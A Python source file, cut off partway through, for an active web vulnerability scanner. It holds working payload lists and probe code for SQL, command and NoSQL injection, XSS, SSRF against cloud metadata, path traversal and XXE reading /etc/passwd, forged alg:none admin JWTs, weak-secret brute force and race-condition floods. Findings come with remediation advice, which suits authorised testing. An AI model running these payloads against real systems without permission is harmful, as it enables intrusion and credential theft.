#!/usr/bin/env python3
"""
OpenClaw Vulnerability Scanner — Active Detection & Validation Engine
Detects and validates critical vulnerabilities with proof-of-concept evidence.

Usage:
    python3 vuln_scanner.py --url https://target.com                   # Full scan
    python3 vuln_scanner.py --url https://target.com --checks sqli,ssrf,xss
    python3 vuln_scanner.py --url https://target.com --param id --value 1
    python3 vuln_scanner.py --url https://target.com --nuclei           # Run Nuclei too
    python3 vuln_scanner.py --url https://target.com --output json > report.json

Requirements:
    pip3 install requests rich
    brew install nuclei  (optional, for CVE template scanning)
"""

import argparse
import json
import subprocess
import sys
import time
from dataclasses import dataclass, field, asdict
from typing import Optional
from urllib.parse import urljoin, urlparse, urlencode, parse_qs

try:
    import requests
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
except ImportError:
    print("[!] Run: pip3 install requests rich")
    sys.exit(1)

console = Console()

# ─────────────────────────────────────────────────────────────────────────────
# Data Models
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    vuln_type: str         # e.g. "SQL Injection"
    title: str
    url: str
    parameter: str         # vulnerable parameter
    payload: str           # payload that triggered the finding
    evidence: str          # response snippet or OOB confirmation
    owasp: str
    cwe: str
    cvss: str
    remediation: str
    confirmed: bool = False

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEVERITY_COLORS = {"CRITICAL": "bold red", "HIGH": "orange3", "MEDIUM": "yellow", "LOW": "green", "INFO": "cyan"}


# ─────────────────────────────────────────────────────────────────────────────
# HTTP Session
# ─────────────────────────────────────────────────────────────────────────────

class Scanner:
    def __init__(self, base_url: str, timeout: int = 15, token: str = ""):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.findings: list[Finding] = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (SecurityResearch/OpenClawOS)",
        })
        if token:
            self.session.headers["Authorization"] = f"Bearer {token}"

    def _get(self, url: str, params: dict | None = None, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.get(url, params=params, timeout=self.timeout, allow_redirects=True, **kwargs)
        except Exception:
            return None

    def _post(self, url: str, data: dict | None = None, json_body: dict | None = None, **kwargs) -> Optional[requests.Response]:
        try:
            return self.session.post(url, data=data, json=json_body, timeout=self.timeout, **kwargs)
        except Exception:
            return None

    def _add(self, f: Finding) -> None:
        self.findings.append(f)
        color = SEVERITY_COLORS[f.severity]
        icon = "💀" if f.severity == "CRITICAL" else "🔴" if f.severity == "HIGH" else "🟡"
        console.print(f"  {icon} [{color}]{f.severity}[/{color}] {f.vuln_type}: {f.title}")
        console.print(f"      [dim]Param: {f.parameter} | Payload: {f.payload[:60]}[/dim]")
        console.print(f"      [dim]Evidence: {f.evidence[:100]}[/dim]\n")


# ─────────────────────────────────────────────────────────────────────────────
# 1. SQL Injection Detection
# ─────────────────────────────────────────────────────────────────────────────

SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch",
    "oci_parse",
    "pg_query",
    "sqlite_query",
    "warning: mysql",
    "sqlstate",
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "jdbc error",
    "invalid query",
]

SQL_PAYLOADS = [
    ("'",       "Error-based injection probe"),
    ("''",      "Double-quote probe"),
    ("1 AND 1=1--", "Boolean true"),
    ("1 AND 1=2--", "Boolean false"),
    ("1' AND SLEEP(3)--", "Time-based (MySQL)"),
    ("1; WAITFOR DELAY '0:0:3'--", "Time-based (MSSQL)"),
    ("1' ORDER BY 1--", "Column count probe"),
]

def check_sqli(scanner: Scanner, url: str, param: str, baseline_value: str = "1") -> list[Finding]:
    results = []
    console.print(f"[bold]SQLi[/bold] → {url} [param={param}]")

    # Get baseline response
    baseline = scanner._get(url, {param: baseline_value})
    if not baseline:
        console.print("  [dim]Could not reach endpoint[/dim]")
        return results
    baseline_len = len(baseline.text)

    for payload, desc in SQL_PAYLOADS:
        resp = scanner._get(url, {param: payload})
        if not resp:
            continue

        text_lower = resp.text.lower()

        # Check for SQL error strings
        for err in SQL_ERROR_PATTERNS:
            if err in text_lower:
                f = Finding(
                    severity="CRITICAL",
                    vuln_type="SQL Injection",
                    title=f"Error-based SQLi confirmed in parameter '{param}'",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"SQL error: '{err}' found in response",
                    owasp="A03:2021 Injection",
                    cwe="CWE-89",
                    cvss="9.8",
                    remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                    confirmed=True,
                )
                results.append(f)
                scanner._add(f)
                break

        # Time-based detection (SLEEP / WAITFOR)
        if "sleep" in payload.lower() or "waitfor" in payload.lower():
            start = time.time()
            scanner._get(url, {param: payload})
            elapsed = time.time() - start
            if elapsed >= 2.8:
                f = Finding(
                    severity="HIGH",
                    vuln_type="SQL Injection (Time-based Blind)",
                    title=f"Blind SQLi (time-based) in parameter '{param}'",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Response delayed {elapsed:.1f}s (>{3}s threshold) with payload: {payload}",
                    owasp="A03:2021 Injection",
                    cwe="CWE-89",
                    cvss="8.1",
                    remediation="Use parameterized queries. Audit all database queries for user-controlled inputs.",
                    confirmed=True,
                )
                results.append(f)
                scanner._add(f)

    if not results:
        console.print("  [green]✓ No SQLi indicators found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 2. XSS Detection
# ─────────────────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    ('<script>alert("CLAWXSS")</script>',     "Basic script tag"),
    ('"><img src=x onerror=alert("CLAWXSS")>', "Attribute breakout"),
    ("';alert('CLAWXSS')//",                   "JS context"),
    ("<svg onload=alert('CLAWXSS')>",          "SVG event handler"),
    ("javascript:alert('CLAWXSS')",            "Protocol handler"),
]

def check_xss(scanner: Scanner, url: str, param: str) -> list[Finding]:
    results = []
    console.print(f"[bold]XSS[/bold] → {url} [param={param}]")
    marker = "CLAWXSS"

    for payload, desc in XSS_PAYLOADS:
        resp = scanner._get(url, {param: payload})
        if not resp:
            continue
        content_type = resp.headers.get("Content-Type", "")
        if "text/html" not in content_type:
            continue
        if marker in resp.text:
            # Determine context
            idx = resp.text.find(marker)
            context = resp.text[max(0, idx - 30): idx + 50]
            # Check if unescaped
            if payload.replace('"', "&quot;") not in resp.text and payload in resp.text:
                f = Finding(
                    severity="HIGH",
                    vuln_type="Cross-Site Scripting (Reflected XSS)",
                    title=f"Reflected XSS in parameter '{param}'",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Unescaped reflection: ...{context}...",
                    owasp="A03:2021 Injection",
                    cwe="CWE-79",
                    cvss="6.1",
                    remediation="Apply context-aware output encoding. Use Content-Security-Policy header.",
                    confirmed=True,
                )
                results.append(f)
                scanner._add(f)
                break

    if not results:
        console.print("  [green]✓ No reflected XSS found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 3. SSRF Detection
# ─────────────────────────────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1"),
    ("http://metadata.google.internal/", "GCP metadata"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://[::1]/", "IPv6 localhost"),
    ("http://0.0.0.0/", "Zero IP"),
]

SSRF_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",  # AWS
    "computeMetadata", "serviceAccounts",               # GCP
    "localhost", "127.0.0.1", "Connection refused",
]

def check_ssrf(scanner: Scanner, url: str, param: str) -> list[Finding]:
    results = []
    console.print(f"[bold]SSRF[/bold] → {url} [param={param}]")

    for payload, label in SSRF_PAYLOADS:
        resp = scanner._get(url, {param: payload})
        if not resp:
            continue
        text = resp.text.lower()
        for indicator in SSRF_INDICATORS:
            if indicator.lower() in text:
                f = Finding(
                    severity="CRITICAL",
                    vuln_type="Server-Side Request Forgery (SSRF)",
                    title=f"SSRF confirmed — {label} accessible via '{param}'",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"Indicator '{indicator}' found in response body",
                    owasp="A10:2021 Server-Side Request Forgery",
                    cwe="CWE-918",
                    cvss="9.8",
                    remediation="Validate/allowlist target URLs server-side. Block internal IP ranges.",
                    confirmed=True,
                )
                results.append(f)
                scanner._add(f)
                break

    if not results:
        console.print("  [green]✓ No SSRF indicators found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 4. Path Traversal Detection
# ─────────────────────────────────────────────────────────────────────────────

PATH_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc//passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../etc/shadow",
    "/etc/passwd",
]

UNIX_PASSWD_SIGNATURE = "root:x:0:"

def check_path_traversal(scanner: Scanner, url: str, param: str) -> list[Finding]:
    results = []
    console.print(f"[bold]Path Traversal[/bold] → {url} [param={param}]")

    for payload in PATH_PAYLOADS:
        resp = scanner._get(url, {param: payload})
        if not resp:
            continue
        if UNIX_PASSWD_SIGNATURE in resp.text:
            f = Finding(
                severity="CRITICAL",
                vuln_type="Path Traversal / LFI",
                title=f"Path traversal confirmed — /etc/passwd readable via '{param}'",
                url=url,
                parameter=param,
                payload=payload,
                evidence=f"/etc/passwd content: {resp.text[:80]}",
                owasp="A01:2021 Broken Access Control",
                cwe="CWE-22",
                cvss="7.5",
                remediation="Validate and sanitize file paths. Use an allowlist of permitted files. Avoid passing user input to file system calls.",
                confirmed=True,
            )
            results.append(f)
            scanner._add(f)
            break

    if not results:
        console.print("  [green]✓ No path traversal found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 5. Command Injection (Time-based)
# ─────────────────────────────────────────────────────────────────────────────

CMD_PAYLOADS = [
    ("; sleep 4",            "Unix semicolon"),
    ("| sleep 4",            "Unix pipe"),
    ("&& sleep 4",           "Unix AND"),
    ("$(sleep 4)",           "Unix substitution"),
    ("`sleep 4`",            "Backtick"),
    ("& ping -c 4 127.0.0.1 &", "Unix ping"),
]

def check_cmdi(scanner: Scanner, url: str, param: str, baseline_value: str = "localhost") -> list[Finding]:
    results = []
    console.print(f"[bold]Command Injection[/bold] → {url} [param={param}]")

    for payload, desc in CMD_PAYLOADS:
        start = time.time()
        scanner._get(url, {param: baseline_value + payload})
        elapsed = time.time() - start

        if elapsed >= 3.5:
            f = Finding(
                severity="CRITICAL",
                vuln_type="OS Command Injection (Blind/Time-based)",
                title=f"Command injection confirmed (time-based) in '{param}'",
                url=url,
                parameter=param,
                payload=payload,
                evidence=f"Response delayed {elapsed:.1f}s with payload: {payload}",
                owasp="A03:2021 Injection",
                cwe="CWE-78",
                cvss="9.8",
                remediation="Never pass user input to system commands. Use safe APIs. Whitelist allowed command arguments.",
                confirmed=True,
            )
            results.append(f)
            scanner._add(f)
            break

    if not results:
        console.print("  [green]✓ No command injection timing anomaly[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 6. Security Headers Check
# ─────────────────────────────────────────────────────────────────────────────

REQUIRED_HEADERS = {
    "Strict-Transport-Security": ("MEDIUM", "HSTS missing — enables downgrade attacks", "A05:2021", "CWE-319", "4.3"),
    "Content-Security-Policy":   ("MEDIUM", "CSP missing — enables XSS amplification", "A05:2021", "CWE-693", "4.3"),
    "X-Content-Type-Options":    ("LOW",    "X-Content-Type-Options missing — MIME sniffing", "A05:2021", "CWE-16", "3.7"),
    "X-Frame-Options":           ("LOW",    "X-Frame-Options missing — clickjacking risk", "A05:2021", "CWE-1021", "3.7"),
    "Referrer-Policy":           ("LOW",    "Referrer-Policy missing", "A05:2021", "CWE-200", "3.1"),
}

def check_headers(scanner: Scanner, url: str) -> list[Finding]:
    results = []
    console.print(f"[bold]Security Headers[/bold] → {url}")
    resp = scanner._get(url)
    if not resp:
        console.print("  [dim]Could not reach[/dim]")
        return results

    for header, (sev, title, owasp, cwe, cvss) in REQUIRED_HEADERS.items():
        if header not in resp.headers:
            f = Finding(
                severity=sev,
                vuln_type="Security Misconfiguration",
                title=title,
                url=url,
                parameter=header,
                payload="(missing header)",
                evidence=f"{header} not present in HTTP response",
                owasp=owasp,
                cwe=cwe,
                cvss=cvss,
                remediation=f"Add the '{header}' response header with a secure value.",
                confirmed=True,
            )
            results.append(f)
            scanner._add(f)
        else:
            console.print(f"  [green]✓[/green] {header}: {resp.headers[header][:60]}")

    # CORS check
    cors_resp = scanner._get(url, headers={"Origin": "https://evil.attacker.com"})
    if cors_resp:
        acao = cors_resp.headers.get("Access-Control-Allow-Origin", "")
        acac = cors_resp.headers.get("Access-Control-Allow-Credentials", "")
        if acao in ("*",) or (acao == "https://evil.attacker.com" and acac.lower() == "true"):
            f = Finding(
                severity="HIGH",
                vuln_type="Insecure CORS Policy",
                title="CORS misconfiguration — arbitrary origin allowed with credentials",
                url=url,
                parameter="Access-Control-Allow-Origin",
                payload="Origin: https://evil.attacker.com",
                evidence=f"ACAO: {acao}, ACAC: {acac}",
                owasp="A05:2021 Security Misconfiguration",
                cwe="CWE-942",
                cvss="7.5",
                remediation="Restrict Access-Control-Allow-Origin to explicit trusted origins. Never combine '*' with credentials.",
                confirmed=True,
            )
            results.append(f)
            scanner._add(f)

    return results


# ─────────────────────────────────────────────────────────────────────────────
# 7. Access Control — IDOR & Privilege Escalation
# ─────────────────────────────────────────────────────────────────────────────

def check_idor(scanner: Scanner, url: str, param: str,
               token_low: str = "", token_high: str = "") -> list[Finding]:
    """Test for IDOR by cycling through sequential IDs and cross-account access."""
    results = []
    console.print(f"[bold]IDOR / Access Control[/bold] → {url} [param={param}]")

    # Sequential ID probing — check if incrementing IDs reveals other users' data
    ids_to_test = ["0", "1", "-1", "2", "99999", "null", "undefined", "../1"]
    baseline = scanner._get(url, {param: "1"})
    baseline_len = len(baseline.text) if baseline else 0

    exposed = []
    for test_id in ids_to_test:
        resp = scanner._get(url, {param: test_id})
        if resp and resp.status_code == 200 and len(resp.text) > 50:
            if resp.text != (baseline.text if baseline else ""):
                exposed.append((test_id, resp.status_code, len(resp.text)))

    if len(exposed) >= 3:  # Multiple IDs returning different data = likely IDOR
        f = Finding(
            severity="HIGH",
            vuln_type="Insecure Direct Object Reference (IDOR)",
            title=f"IDOR — multiple object IDs accessible via '{param}'",
            url=url, parameter=param,
            payload="Sequential ID enumeration: " + str([e[0] for e in exposed[:3]]),
            evidence=f"{len(exposed)} different IDs return 200 with distinct content",
            owasp="A01:2021 Broken Access Control",
            cwe="CWE-639", cvss="8.1",
            remediation="Implement indirect object references (UUIDs). Validate ownership server-side on every request.",
            confirmed=True,
        )
        results.append(f); scanner._add(f)

    # Cross-account access — use low-priv token to access high-priv resource
    if token_low and token_high:
        resp_high = scanner._get(url, {param: "1"}, headers={"Authorization": f"Bearer {token_high}"})
        resp_low  = scanner._get(url, {param: "1"}, headers={"Authorization": f"Bearer {token_low}"})
        if resp_high and resp_low and resp_high.status_code == 200 and resp_low.status_code == 200:
            if resp_high.text == resp_low.text:
                f = Finding(
                    severity="CRITICAL",
                    vuln_type="Broken Access Control — Privilege Escalation",
                    title="Low-privilege user can access high-privilege resource",
                    url=url, parameter=param, payload="Cross-account token swap",
                    evidence="Same response body for admin vs regular user token",
                    owasp="A01:2021 Broken Access Control",
                    cwe="CWE-284", cvss="9.1",
                    remediation="Enforce role-based access control (RBAC) at the resource level, not just the route level.",
                    confirmed=True,
                )
                results.append(f); scanner._add(f)

    # Auth bypass — try accessing without any token
    no_auth = scanner.session.get(url, params={param: "1"}, timeout=10,
                                   headers={k: v for k, v in scanner.session.headers.items()
                                            if k.lower() != "authorization"})
    if no_auth and no_auth.status_code == 200 and len(no_auth.text) > 50:
        f = Finding(
            severity="CRITICAL",
            vuln_type="Authentication Bypass",
            title=f"Resource accessible without authentication via '{param}'",
            url=url, parameter=param, payload="(no Authorization header)",
            evidence=f"HTTP 200 returned without auth token. Response: {no_auth.text[:80]}",
            owasp="A01:2021 Broken Access Control",
            cwe="CWE-306", cvss="9.8",
            remediation="Enforce authentication on all protected endpoints. Use middleware/gateway-level auth checks.",
            confirmed=True,
        )
        results.append(f); scanner._add(f)

    if not results:
        console.print("  [green]✓ No access control issues found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 8. NoSQL Injection
# ─────────────────────────────────────────────────────────────────────────────

NOSQL_PAYLOADS = [
    ({"$gt": ""},         "Greater-than operator"),
    ({"$ne": None},       "Not-equal operator"),
    ({"$exists": True},   "Exists operator"),
    ({"$regex": ".*"},    "Regex match-all"),
    ({"$where": "1==1"},  "Where clause injection"),
]

def check_nosqli(scanner: Scanner, url: str, param: str) -> list[Finding]:
    results = []
    console.print(f"[bold]NoSQL Injection[/bold] → {url} [param={param}]")

    baseline = scanner._get(url, {param: "normalvalue"})
    baseline_len = len(baseline.text) if baseline else 0

    for operator, desc in NOSQL_PAYLOADS:
        # Test via JSON body (POST)
        resp = scanner._post(url, json_body={param: operator})
        if resp and resp.status_code in (200, 201) and len(resp.text) > baseline_len + 20:
            f = Finding(
                severity="CRITICAL",
                vuln_type="NoSQL Injection",
                title=f"NoSQL injection ({desc}) via '{param}'",
                url=url, parameter=param,
                payload=f"{param}: {operator}",
                evidence=f"Response grew from {baseline_len} to {len(resp.text)} bytes with operator payload",
                owasp="A03:2021 Injection",
                cwe="CWE-943", cvss="9.8",
                remediation="Validate and sanitize inputs. Use an ODM with strict schema validation. Never pass raw user input as query operators.",
                confirmed=True,
            )
            results.append(f); scanner._add(f); break

    if not results:
        console.print("  [green]✓ No NoSQL injection found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 9. XXE — XML External Entity Injection
# ─────────────────────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',   "Local file read"),
    ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>', "Hostname read"),
    ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><test>&xxe;</test>', "SSRF via XXE"),
]
XXE_SIGNATURES = ["root:x:0:", "bin:x:1:", "daemon:x:", "ami-id", "instance-id"]

def check_xxe(scanner: Scanner, url: str) -> list[Finding]:
    results = []
    console.print(f"[bold]XXE[/bold] → {url}")
    headers = {"Content-Type": "application/xml"}

    for payload, desc in XXE_PAYLOADS:
        try:
            resp = scanner.session.post(url, data=payload.encode(),
                                        headers={**headers}, timeout=15)
            for sig in XXE_SIGNATURES:
                if sig in resp.text:
                    f = Finding(
                        severity="CRITICAL",
                        vuln_type="XML External Entity (XXE) Injection",
                        title=f"XXE confirmed — {desc}",
                        url=url, parameter="XML body", payload=payload[:80],
                        evidence=f"Signature '{sig}' found in response: {resp.text[:100]}",
                        owasp="A03:2021 Injection",
                        cwe="CWE-611", cvss="9.1",
                        remediation="Disable external entity processing in your XML parser. Use a JSON API where possible.",
                        confirmed=True,
                    )
                    results.append(f); scanner._add(f); break
        except Exception:
            pass

    if not results:
        console.print("  [green]✓ No XXE found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 10. Deserialization Detection
# ─────────────────────────────────────────────────────────────────────────────

DESER_SIGNATURES = {
    "java":   b"\xac\xed\x00\x05",   # Java serialized object magic bytes
    "php":    b'O:',                   # PHP serialized object
    "net":    b"AAEAAAD",             # .NET BinaryFormatter base64 prefix
    "python": b"\x80\x04\x95",       # Python pickle protocol 4
}

def check_deserialization(scanner: Scanner, url: str) -> list[Finding]:
    """Detect deserialization sinks by inspecting cookies, parameters, and response patterns."""
    results = []
    console.print(f"[bold]Deserialization[/bold] → {url}")

    resp = scanner._get(url)
    if not resp:
        console.print("  [dim]Could not reach[/dim]")
        return results

    # Check cookies for serialized object patterns
    import base64
    for cookie_name, cookie_val in resp.cookies.items():
        for lang, sig in DESER_SIGNATURES.items():
            try:
                decoded = base64.b64decode(cookie_val + "==")
                if decoded.startswith(sig if isinstance(sig, bytes) else sig.encode()):
                    f = Finding(
                        severity="HIGH",
                        vuln_type=f"Insecure Deserialization ({lang})",
                        title=f"Serialized {lang} object detected in cookie '{cookie_name}'",
                        url=url, parameter=f"Cookie: {cookie_name}",
                        payload=cookie_val[:40],
                        evidence=f"Cookie contains {lang} serialized data (magic bytes match)",
                        owasp="A08:2021 Software and Data Integrity Failures",
                        cwe="CWE-502", cvss="8.1",
                        remediation=f"Replace {lang} serialization with JSON/structured formats. Validate integrity with HMAC. Consider using safer serialization libraries.",
                        confirmed=True,
                    )
                    results.append(f); scanner._add(f)
            except Exception:
                pass

    # Check response body for Java serialization patterns
    if resp.content[:4] == DESER_SIGNATURES["java"]:
        f = Finding(
            severity="HIGH",
            vuln_type="Insecure Deserialization (Java)",
            title="Server response contains raw Java serialized object",
            url=url, parameter="Response body",
            payload="(response inspection)",
            evidence=f"Java magic bytes \\xac\\xed\\x00\\x05 at response start",
            owasp="A08:2021 Software and Data Integrity Failures",
            cwe="CWE-502", cvss="8.1",
            remediation="Replace Java serialization with a safe alternative (JSON, Protobuf). If required, use serialization filters (JEP 290).",
            confirmed=True,
        )
        results.append(f); scanner._add(f)

    if not results:
        console.print("  [green]✓ No deserialization indicators found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 11. Client-Side — Prototype Pollution & DOM Vulnerabilities
# ─────────────────────────────────────────────────────────────────────────────

PROTO_PAYLOADS = [
    ("__proto__[admin]",   "true",       "Prototype chain pollution via GET param"),
    ("__proto__.admin",    "true",       "Dot-notation prototype pollution"),
    ("constructor.prototype.admin", "true", "Constructor prototype via param"),
]

DOM_SINKS = [
    "document.write", "innerHTML", "outerHTML", "eval(",
    "setTimeout(", "setInterval(", "location.href", ".src ="
]

def check_client_side(scanner: Scanner, url: str, param: str) -> list[Finding]:
    results = []
    console.print(f"[bold]Client-Side / Prototype Pollution[/bold] → {url}")

    # Prototype pollution via query params
    for proto_param, value, desc in PROTO_PAYLOADS:
        resp = scanner._get(url, {proto_param: value})
        if resp and resp.status_code == 200:
            # Look for reflected pollution indicators in response
            if "admin\":\"true" in resp.text or "admin': true" in resp.text or '"admin":true' in resp.text:
                f = Finding(
                    severity="HIGH",
                    vuln_type="Prototype Pollution",
                    title=f"Prototype pollution via query parameter '{proto_param}'",
                    url=url, parameter=proto_param, payload=f"{proto_param}={value}",
                    evidence=f"Polluted property reflected in response: {resp.text[:100]}",
                    owasp="A03:2021 Injection",
                    cwe="CWE-1321", cvss="7.3",
                    remediation="Sanitize object property keys. Use Object.create(null) for trusted data maps. Freeze prototype with Object.freeze(Object.prototype).",
                    confirmed=True,
                )
                results.append(f); scanner._add(f); break

    # DOM sink detection in HTML response source
    resp = scanner._get(url, {param: "CLAWDOM"})
    if resp and "text/html" in resp.headers.get("Content-Type", ""):
        src = resp.text
        for sink in DOM_SINKS:
            if sink in src:
                # Check if user input reaches the sink
                idx = src.find(sink)
                context = src[max(0, idx-100):idx+80]
                if "CLAWDOM" in context or param in context:
                    f = Finding(
                        severity="HIGH",
                        vuln_type="DOM-based XSS",
                        title=f"User input reaches dangerous DOM sink '{sink}'",
                        url=url, parameter=param, payload="CLAWDOM (marker)",
                        evidence=f"Sink: {sink} — Input reaches: ...{context[:100]}...",
                        owasp="A03:2021 Injection",
                        cwe="CWE-79", cvss="6.1",
                        remediation="Never pass user-controlled data to dangerous DOM APIs. Use textContent instead of innerHTML. Apply DOMPurify for sanitization.",
                        confirmed=True,
                    )
                    results.append(f); scanner._add(f); break

    if not results:
        console.print("  [green]✓ No client-side prototype pollution or DOM sinks found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 12. Authentication — JWT & Session Management
# ─────────────────────────────────────────────────────────────────────────────

import base64 as _b64, hmac as _hmac, hashlib as _hashlib

JWT_WEAK_SECRETS = ["secret", "password", "changeme", "jwt", "123456",
                    "test", "admin", "key", "private", "", "qwerty"]

def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    try:
        parts = token.split(".")
        if len(parts) != 3: return None
        header  = json.loads(_b64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(_b64.urlsafe_b64decode(parts[1] + "=="))
        return header, payload, parts[2]
    except Exception:
        return None

def check_jwt_session(scanner: Scanner, url: str, token: str = "") -> list[Finding]:
    results = []
    console.print(f"[bold]JWT & Session Management[/bold] → {url}")

    # 1 — Check response cookies for session security flags
    resp = scanner._get(url)
    if resp:
        for cookie in resp.cookies:
            issues = []
            if not cookie.secure:   issues.append("Secure flag missing")
            if not cookie.has_nonstandard_attr("HttpOnly"): issues.append("HttpOnly flag missing")
            samesite = cookie.has_nonstandard_attr("SameSite")
            if not samesite: issues.append("SameSite not set")
            if issues:
                f = Finding(
                    severity="MEDIUM",
                    vuln_type="Insecure Session Cookie",
                    title=f"Cookie '{cookie.name}' missing security attributes: {', '.join(issues)}",
                    url=url, parameter=f"Set-Cookie: {cookie.name}",
                    payload="(cookie attribute inspection)",
                    evidence=f"Issues: {', '.join(issues)}",
                    owasp="A07:2021 Identification and Authentication Failures",
                    cwe="CWE-614", cvss="5.3",
                    remediation="Set Secure, HttpOnly, and SameSite=Strict on all session cookies.",
                    confirmed=True,
                )
                results.append(f); scanner._add(f)

    # 2 — JWT analysis if token provided
    if token:
        parsed = _parse_jwt(token)
        if parsed:
            header, payload_data, sig = parsed
            alg = header.get("alg", "")

            # alg:none attack
            if alg.lower() != "none":
                forged_header  = _b64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
                forged_payload = _b64.urlsafe_b64encode(json.dumps({**payload_data, "role":"admin"}).encode()).rstrip(b"=").decode()
                forged_token   = f"{forged_header}.{forged_payload}."
                resp_forged = scanner._get(url, headers={"Authorization": f"Bearer {forged_token}"})
                if resp_forged and resp_forged.status_code == 200:
                    f = Finding(
                        severity="CRITICAL",
                        vuln_type="JWT Algorithm Confusion (alg:none)",
                        title="Server accepts JWT with alg:none — signature not validated",
                        url=url, parameter="Authorization: Bearer",
                        payload=f"alg:none forged JWT with role:admin",
                        evidence=f"Forged token accepted — HTTP {resp_forged.status_code}",
                        owasp="A02:2021 Cryptographic Failures",
                        cwe="CWE-347", cvss="9.8",
                        remediation="Reject tokens with alg:none. Whitelist allowed algorithms server-side. Never trust the 'alg' header from client input.",
                        confirmed=True,
                    )
                    results.append(f); scanner._add(f)

            # Weak secret brute-force (HS256)
            if alg == "HS256":
                header_b64, payload_b64 = token.split(".")[:2]
                signing_input = f"{header_b64}.{payload_b64}".encode()
                try:
                    actual_sig = _b64.urlsafe_b64decode(sig + "==")
                except Exception:
                    actual_sig = b""
                for secret in JWT_WEAK_SECRETS:
                    test_sig = _hmac.new(secret.encode(), signing_input, _hashlib.sha256).digest()
                    if test_sig == actual_sig:
                        f = Finding(
                            severity="CRITICAL",
                            vuln_type="JWT Weak Secret (HS256)",
                            title=f"JWT signed with weak secret: '{secret}'",
                            url=url, parameter="Authorization: Bearer",
                            payload=f"Brute-forced secret: '{secret}'",
                            evidence=f"HMAC-SHA256 signature verified with secret '{secret}'",
                            owasp="A02:2021 Cryptographic Failures",
                            cwe="CWE-521", cvss="9.8",
                            remediation="Use a cryptographically random secret (>= 256 bits). Rotate secrets immediately. Consider RS256/ES256 asymmetric signing.",
                            confirmed=True,
                        )
                        results.append(f); scanner._add(f); break

    if not results:
        console.print("  [green]✓ No JWT/session issues found[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 13. Business Logic — Race Conditions
# ─────────────────────────────────────────────────────────────────────────────

from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed

def check_race_condition(scanner: Scanner, url: str, method: str = "POST",
                         body: dict | None = None, workers: int = 20) -> list[Finding]:
    """Detect race conditions by sending concurrent identical requests at the same instant."""
    results = []
    console.print(f"[bold]Race Conditions[/bold] → {url} ({workers} concurrent {method})")
    body = body or {}

    statuses: list[int] = []
    responses: list[str] = []

    def fire() -> tuple[int, str]:
        resp = scanner._post(url, json_body=body) if method.upper() == "POST" else scanner._get(url)
        return (resp.status_code, resp.text[:200]) if resp else (0, "")

    with ThreadPoolExecutor(max_workers=workers) as exe:
        futures = [exe.submit(fire) for _ in range(workers)]
        for fut in _as_completed(futures):
            code, text = fut.result()
            statuses.append(code); responses.append(text)

    success_count = sum(1 for s in statuses if s in (200, 201, 202))
    unique_responses = len(set(responses))

    console.print(f"  {workers} concurrent requests → {success_count} success, {unique_responses} unique responses")

    # Race condition indicator: many successes with varying content
    # (e.g. a coupon applied twice, balance checked twice before deducting)
    if success_count >= workers * 0.8 and unique_responses > 1:
        f = Finding(
            severity="HIGH",
            vuln_type="Business Logic — Race Condition (TOCTOU)",
            title=f"Potential race condition at {url} — {unique_responses} different outcomes from {workers} concurrent requests",
            url=url, parameter="(concurrent requests)",
            payload=f"{workers}x simultaneous {method} requests",
            evidence=f"Success: {success_count}/{workers}, Distinct responses: {unique_responses}",
            owasp="A04:2021 Insecure Design",
            cwe="CWE-362", cvss="7.5",
            remediation="Implement atomic database transactions. Use distributed locks or idempotency keys for business-critical operations.",
            confirmed=False,  # Needs manual confirmation
        )
        results.append(f); scanner._add(f)
    else:
        console.print("  [green]✓ No race condition anomaly detected[/green]")
    return results


# ─────────────────────────────────────────────────────────────────────────────
# 14. Infrastructure — Misconfigurations & Exposed Services
# ─────────────────────────────────────────────────────────────────────────────

INFRA_PATHS = [
    ("/.env",              "Environment file",       "CRITICAL", "CWE-538", "9.8"),
